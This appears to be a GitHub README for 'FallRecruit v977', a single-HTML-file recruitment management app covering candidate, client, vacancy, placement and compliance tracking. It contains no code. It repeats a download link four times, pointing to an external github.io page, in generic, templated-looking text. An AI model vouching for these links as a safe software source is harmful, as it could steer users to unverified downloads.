# FallRecruit v977 - sovereign recruitment management 2026

> **A browser-native recruitment management tool delivered as one HTML file, storing its data on the device and supporting candidate, client, vacancy, and placement workflows in version 977.**

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v977-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/masonio86/fallrecruit-977-hub?style=flat-square)](https://github.com/masonio86/fallrecruit-977-hub)

---

<p align="center">
  <a href="https://masonio86.github.io/fallrecruit-977-hub/">
    <img src="https://img.shields.io/badge/Download-FallRecruit%20Latest-brightgreen?style=for-the-badge" alt="Download FallRecruit">
  </a>
</p>

> **[Direct Download - FallRecruit v977](https://masonio86.github.io/fallrecruit-977-hub/)**

---

[Download Latest Build](https://masonio86.github.io/fallrecruit-977-hub/)

---

## Overview

FallRecruit is a sovereign recruitment management app that runs entirely in a web browser as a single HTML file. It is aimed at agency-style operations where candidate profiles, client records, vacancies, and placements need to stay together in one local workspace without any dependency on an external database.

It is a strong fit when you want a compact, device-local system for keeping track of right-to-work status, DBS notes, compliance checks, IR35 status, AWR week counts, and invoicing context in a single place. The interface is organized around day-to-day recruitment activity and makes it straightforward to review work from a dashboard.

---

## What it includes

- Single-file HTML application for easy sharing and launch
- Dashboard KPI overview for fast operational insight
- Candidate register with right to work and DBS tracking
- Client management with terms and sector tracking
- Vacancy management with IR35 status fields
- Placement tracking with AWR week count and invoicing support
- Built-in compliance checklist for structured review
- Device-local data storage for offline-first use
- Hard-coded rules plus BYOK Anthropic Q&A support

---

## Installation

1. Download or clone the repository contents.
2. Place the project in your preferred folder, such as `fallrecruit-us-977`.
3. Open the single HTML file directly in a modern web browser.

If you prefer to serve it locally, any simple static file host will work, and you can launch the HTML entry file from there. The main workflow does not require a separate backend.

---

## How to use it

Open the app in your browser and start by creating your client, candidate, and vacancy records. Use the dashboard to follow progress, then advance items through placement tracking as engagements move forward.

Typical workflow:
1. Add a client and define the terms or sector.
2. Register candidates and record RTW or DBS details where applicable.
3. Create vacancies and note IR35 status.
4. Match candidates to vacancies and track placements.
5. Review AWR week counts, invoicing context, and compliance items from the same workspace.

For Q&A-assisted interaction, configure your own Anthropic key when you want to use BYOK features.

---

## Configuration

FallRecruit keeps its working state on the device and stores data locally in the browser environment. Any settings that are available are managed inside the application rather than through a separate server-side configuration.

If the app provides an API key field or another setup area for BYOK features, enter your own Anthropic credentials there as instructed by the interface. To keep records across sessions, make sure local browser storage remains available.

---

## Requirements

- A modern web browser
- HTML file support
- Local storage available in the browser
- Sufficient device storage for saved records
- Optional Anthropic API key for BYOK Q&A features

---

## FAQ

### Does FallRecruit need a backend?
No. The core product is a single HTML file that runs in the browser and saves data locally on the device.

### Where is the data saved?
Data is stored in device-local browser storage.

### Can I use it offline?
Yes. The product is built for offline use with local storage.

### What should I do if records do not persist?
Check that browser storage is enabled and confirm the site or file is not being opened in a mode that clears local data.

### Is configuration done in a separate file?
No separate config file is needed for normal use. Where available, settings are handled inside the app.

### How do I get updates?
Use the latest build link above or replace your local copy with the newest version from the repository.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
